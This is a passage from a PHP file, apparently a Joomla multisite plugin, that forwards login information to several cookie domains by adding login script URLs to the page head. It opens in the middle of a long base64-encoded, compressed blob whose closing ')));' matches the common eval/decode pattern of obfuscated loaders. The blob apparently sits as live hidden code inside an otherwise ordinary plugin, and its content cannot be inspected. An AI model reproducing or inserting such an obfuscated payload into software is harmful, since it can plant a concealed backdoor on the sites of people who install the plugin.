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')));


         // Forward the login information to all the domains (except itself).
         for($i=0; $i<count($cookie_domains); $i++){
            // If there is a specific secret value
            if ( is_array( $cookie_domains[$i])) {
               $domain_str = $cookie_domains[$i][0];
               $cs         = $cookie_domains[$i][2];
            }
            else {
               $domain_str = $cookie_domains[$i];
               $cs         = $cs_main;
            }
            // Extract the protocol when it is present
            if ( preg_match( '#^([a-zA-Z]+)://(.*)#', $domain_str, $match)) {
               $domain_protocol = $match[1];
               $domain = ltrim( $match[2], '.');
            }
            else {
               $domain_protocol = 'http';
               $domain = ltrim( $domain_str, '.');
            }
            if ( empty( $domain)) {
               continue;
            }
            // If the domain is already processed
         	if( !empty( $processed_domains[$domain]) || !empty( $processed_domains['www.'.$domain])){
         	   // Do nothing
         	}
         	// If the domain is not yet processed
         	else {
         	   // Forward the login information to the domain
         	   for ( $jpath_root = dirname( __FILE__); !empty( $jpath_root) && basename( $jpath_root) != 'plugins'; $jpath_root = dirname( $jpath_root));
         	   $jpath_root = dirname( $jpath_root);
         	   $curpath = str_replace( $jpath_root, '', dirname( __FILE__));
         	   $url     = str_replace( DS, '/', $curpath)
         	              . '/multisites_ssidomains/login.php'   // Call LOGIN
         	              ;
         	   $url     = ltrim( $url, '/');
         		if ( $this->params->get('currentsite_protocol', 0) == 1) {
         		   $ping_protocol = $currentsite_protocol;
         		}
         		else {
         		   $ping_protocol = $domain_protocol;
         		}
         		$scripts[]  = $ping_protocol.'://'.$domain.'/'.$url
         		            . '?d='.$d
         		            . (!empty( $SSI_VERIFY_CHECKSUM) ? '&cs='.$cs
         		                                             : (defined( 'MULTISITES_COOKIE_DOMAINS') ? '&cd=1' 
         		                                                                                      : ''))
         		            ;    // Save script login
         		
         		// Add the domain to the list of processed domains
         		$processed_domains[$domain] = true;
         		if ( substr( $domain, 0, 4) == 'www.') {}
         		else {
            		$processed_domains['www.'.$domain] = true;
         		}
         	}
         }
      }
      
      // For each scripts to call
      if ( !empty( $scripts)) {
   		$document = & JFactory::getDocument();
         // Add the script to the document head
         foreach( $scripts as $url) {
            $document->addScript( $url);
         }
      }

	   return true;
	}
} // End class
